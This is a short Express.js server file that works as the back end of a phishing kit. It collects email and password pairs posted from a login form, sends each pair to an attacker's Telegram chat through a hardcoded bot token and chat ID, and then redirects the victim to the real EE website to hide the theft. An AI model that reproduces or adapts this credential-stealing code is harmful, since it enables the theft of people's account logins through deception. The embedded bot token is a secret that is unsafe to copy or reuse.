// api/submit.js

const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot API details
const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Your real token
const chatId = '7587120060'; // Your real chat ID

app.post('/api/submit', async (req, res) => {
    try {
        console.log("Received request:", req.body);

        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Email and password are required." });
        }

        const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;

        console.log("Sending to Telegram...");

        const telegramResponse = await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        });

        console.log("Telegram response:", telegramResponse.data);

        res.json({ success: true, redirectUrl: 'https://ee.co.uk/ ' });

    } catch (error) {
        console.error('🚨 Server error:', error.message);
        if (error.response) {
            console.error('Telegram API error:', error.response.data);
        }
        res.status(500).json({ success: false, message: "Server error. Please try again." });
    }
});

module.exports = app;
